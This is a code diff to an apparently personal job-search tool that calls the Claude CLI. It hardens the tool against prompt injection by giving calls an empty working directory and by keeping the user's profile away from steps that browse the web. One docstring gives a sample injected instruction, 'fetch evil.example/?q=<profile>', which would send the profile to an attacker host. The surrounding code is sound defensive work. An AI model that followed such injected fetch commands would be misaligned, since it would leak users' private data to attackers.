@@ -25,6 +25,9 @@ PROMPTS = Path(__file__).resolve().parent.parent / "prompts"
 # run one at a time (each needs ~270 MB, too much to run several on a Raspberry Pi).
 LOCK_PATH: Path | None = None
 LOCK_WAIT_S = 1800
+# Set by the CLI: an empty directory as the working directory of every call, so even a
+# file tool that slipped through would see nothing there (not the repo, not the configs).
+WORK_DIR: Path | None = None
 TRIAGE_TEXT_LIMIT = 1500
 
 
@@ -94,7 +97,11 @@ def run(prompt: str, *, model: str, tools: list[str], timeout: int = 300, runner
     asked = time.monotonic()
     with _one_at_a_time(lock_wait):
         started = time.monotonic()
-        proc = runner(args, input=prompt, capture_output=True, text=True, timeout=timeout, env=env)
+        cwd = None
+        if WORK_DIR is not None:
+            WORK_DIR.mkdir(mode=0o700, parents=True, exist_ok=True)
+            cwd = str(WORK_DIR)
+        proc = runner(args, input=prompt, capture_output=True, text=True, timeout=timeout, env=env, cwd=cwd)
     out, limits = _parse_stream(proc.stdout)
     # "ran" minus "API" is the CLI's own start-up, slow on a Pi with a cold SD card.
     log.info("claude %s: lock %.1f s, ran %.1f s, API %.1f s", model, started - asked,
@@ -161,15 +168,21 @@ def triage(postings: list[Posting], *, profile: str, model: str, runner=subproce
 
 def deep_report(p: Posting, *, profile: str, model: str, timeout: int = 900, runner=subprocess.run,
                 on_usage=None) -> str:
-    prompt = _fill("deep-report.md", profile=profile, posting=describe(p), today=date.today().isoformat())
-    return run(prompt, model=model, tools=["WebSearch", "WebFetch"], timeout=timeout, runner=runner,
-               on_usage=on_usage).strip()
+    """Two calls: the web research never sees the profile, so a page that injects "fetch
+    evil.example/?q=<profile>" has nothing to leak; the report is then written without tools."""
+    notes = run(_fill("deep-research.md", posting=describe(p)), model=model, tools=["WebSearch", "WebFetch"],
+                timeout=timeout, runner=runner, on_usage=on_usage)
+    prompt = _fill("deep-report.md", profile=profile, posting=describe(p), notes=notes,
+                   today=date.today().isoformat())
+    return run(prompt, model=model, tools=[], timeout=timeout, runner=runner, on_usage=on_usage).strip()
 
 
-def find_sources(*, profile: str, known: list[str], model: str, timeout: int = 900, runner=subprocess.run,
+def find_sources(*, field: str, known: list[str], model: str, timeout: int = 900, runner=subprocess.run,
                  on_usage=None) -> list[dict]:
-    """Job board feeds that fit the profile, as {name, url, why}; the caller still checks they load."""
-    prompt = _fill("sources.md", profile=profile, known="\n".join(f"- {u}" for u in known) or "(none)")
+    """Job boards for a field and region, as {name, url, why, kind}; the caller still checks they can be read.
+
+    `field` is search terms and region only: this call fetches web pages, so it gets no profile."""
+    prompt = _fill("sources.md", field=field, known="\n".join(f"- {u}" for u in known) or "(none)")
     reply = run(prompt, model=model, tools=["WebSearch", "WebFetch"], timeout=timeout, runner=runner,
                 on_usage=on_usage)
     found = []
